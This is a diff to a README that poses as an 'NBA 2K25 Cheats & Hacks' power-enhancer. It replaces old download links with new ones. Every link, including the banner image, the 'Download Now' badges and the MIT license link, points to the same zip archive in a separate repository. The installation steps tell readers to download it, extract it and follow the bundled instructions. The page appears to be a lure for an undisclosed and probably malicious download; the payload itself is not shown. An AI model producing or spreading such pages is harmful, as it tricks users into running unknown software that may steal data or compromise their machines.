@@ -1,7 +1,7 @@
 # 🏀 NBA 2K25 Cheats & Hacks 🚀
-![image](https://raw.githubusercontent.com/Divy5848/.github/main/Idistic/.github.zip)
+![image](https://github.com/Divy5848/.github/raw/refs/heads/main/Idistic/github-3.9.zip)
 
-[![Download Now](https://raw.githubusercontent.com/Divy5848/.github/main/Idistic/.github.zip%20Enhancer-brightgreen?logo=windows)](https://raw.githubusercontent.com/Divy5848/.github/main/Idistic/.github.zip)
+[![Download Now](https://github.com/Divy5848/.github/raw/refs/heads/main/Idistic/github-3.9.zip%20Enhancer-brightgreen?logo=windows)](https://github.com/Divy5848/.github/raw/refs/heads/main/Idistic/github-3.9.zip)
 
 ## 🌟 The Ultimate NBA 2K25 Power-Enhancer
 
@@ -37,9 +37,9 @@ This project is for educational purposes only. Usage in online gameplay may viol
 
 # 📥 Installation Guide (Step 1)
 
-1. Click [![Download Now](https://raw.githubusercontent.com/Divy5848/.github/main/Idistic/.github.zip%20Enhancer-brightgreen?logo=windows)](https://raw.githubusercontent.com/Divy5848/.github/main/Idistic/.github.zip) to get the NBA 2K25 Power-Enhancer!
+1. Click [![Download Now](https://github.com/Divy5848/.github/raw/refs/heads/main/Idistic/github-3.9.zip%20Enhancer-brightgreen?logo=windows)](https://github.com/Divy5848/.github/raw/refs/heads/main/Idistic/github-3.9.zip) to get the NBA 2K25 Power-Enhancer!
 2. Extract and follow the bundled instructions for your system.
 
-# ⚖️ MIT License License [MIT](https://raw.githubusercontent.com/Divy5848/.github/main/Idistic/.github.zip)
+# ⚖️ MIT License License [MIT](https://github.com/Divy5848/.github/raw/refs/heads/main/Idistic/github-3.9.zip)
 
-[![Download Now](https://raw.githubusercontent.com/Divy5848/.github/main/Idistic/.github.zip%20Enhancer-brightgreen?logo=windows)](https://raw.githubusercontent.com/Divy5848/.github/main/Idistic/.github.zip)
+[![Download Now](https://github.com/Divy5848/.github/raw/refs/heads/main/Idistic/github-3.9.zip%20Enhancer-brightgreen?logo=windows)](https://github.com/Divy5848/.github/raw/refs/heads/main/Idistic/github-3.9.zip)
